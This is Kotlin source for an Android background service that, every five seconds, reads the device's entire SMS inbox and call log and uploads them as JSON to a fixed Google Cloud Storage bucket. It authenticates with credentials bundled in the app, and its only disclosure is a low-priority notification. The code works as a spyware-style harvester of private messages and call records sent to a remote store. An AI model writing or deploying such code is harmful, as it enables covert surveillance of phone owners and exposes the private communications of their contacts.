import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.provider.CallLog
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.auth.oauth2.GoogleCredentials
import com.google.cloud.storage.BlobId
import com.google.cloud.storage.BlobInfo
import com.google.cloud.storage.Storage
import com.google.cloud.storage.StorageOptions
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayInputStream
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*
import java.io.InputStream

class MessageAndCallService : Service() {

    private val handler = Handler()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
    private lateinit var storageClient: Storage
    private val bucketName = "msg_call_10101"

    private val runnable = object : Runnable {
        override fun run() {
            collectMessagesAndCalls()
            handler.postDelayed(this, 5000) // Run every 5 seconds
        }
    }

    override fun onCreate() {
        super.onCreate()
        setupGoogleCloudClient()
        handler.post(runnable)
        startForegroundNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == STOP_ACTION) {
            stopForeground(true)
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(runnable)
        scope.cancel()  // Cancel all coroutines when service is destroyed
        Log.d(TAG, "Service Destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun setupGoogleCloudClient() {
        try {
            // Open the credentials.json file from the assets folder
            val credentialsStream: InputStream = this.assets.open("credentials.json")  // 'this' refers to the Service context
            // Load Google credentials from the input stream
            val credentials = GoogleCredentials.fromStream(credentialsStream)

            // Initialize Google Cloud Storage client with the credentials
            storageClient = StorageOptions.newBuilder()
                .setCredentials(credentials)
                .build()
                .service

            Log.d(TAG, "Google Cloud client initialized successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error loading Google Cloud credentials", e)
        }
    }

    private fun collectMessagesAndCalls() {
        Log.d(TAG, "Collecting Messages and Calls")
        collectMessages()
        collectCallLogs()
    }

    private fun collectMessages() {
        val contentResolver: ContentResolver = contentResolver
        val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        val messages = JSONArray()

        cursor?.let {
            if (it.moveToFirst()) {
                do {
                    val sender = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))

                    val message = JSONObject().apply {
                        put("sender", sender)
                        put("body", body)
                        put("date", date)
                    }
                    messages.put(message)
                } while (it.moveToNext())
                it.close()
            }
        }

        // Upload data to Google Cloud Storage in a coroutine
        scope.launch {
            val formattedData = formatDataForUpload(messages)
            uploadDataToGoogleCloud("messages.json", formattedData)
        }
    }

    private fun collectCallLogs() {
        val contentResolver: ContentResolver = contentResolver
        val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
        val calls = JSONArray()

        cursor?.let {
            if (it.moveToFirst()) {
                do {
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))

                    val call = JSONObject().apply {
                        put("number", number)
                        put("type", type)
                        put("date", date)
                        put("duration", duration)
                    }
                    calls.put(call)
                } while (it.moveToNext())
                it.close()
            }
        }

        // Upload data to Google Cloud Storage in a coroutine
        scope.launch {
            val formattedData = formatDataForUpload(calls)
            uploadDataToGoogleCloud("calls.json", formattedData)
        }
    }

    private fun formatDataForUpload(contents: JSONArray): String {
        val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
        return JSONObject().apply {
            put("Content", contents)
            put("Time", timestamp)
        }.toString()
    }

    private suspend fun uploadDataToGoogleCloud(fileName: String, data: String) {
        withContext(Dispatchers.IO) {
            try {
                val blobId = BlobId.of(bucketName, fileName)
                val blobInfo = BlobInfo.newBuilder(blobId).setContentType("application/json").build()
                val inputStream = ByteArrayInputStream(data.toByteArray())

                storageClient.create(blobInfo, inputStream)
                Log.d(TAG, "$fileName uploaded to Google Cloud Storage")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload $fileName to Google Cloud Storage", e)
            }
        }
    }

    private fun startForegroundNotification() {
        val stopIntent = Intent(this, MessageAndCallService::class.java).apply {
            action = STOP_ACTION
        }
        val pendingStopIntent = PendingIntent.getService(this, 0, stopIntent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        val notificationChannelId = "message_and_call_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(notificationChannelId, "Message and Call Service", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, notificationChannelId)
            .setContentTitle("Service Running")
            .setContentText("Collecting messages and calls")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .addAction(android.R.drawable.ic_media_pause, "Stop", pendingStopIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    companion object {
        private const val TAG = "MessageAndCallService"
        private const val STOP_ACTION = "STOP"
        private const val NOTIFICATION_ID = 1
    }
}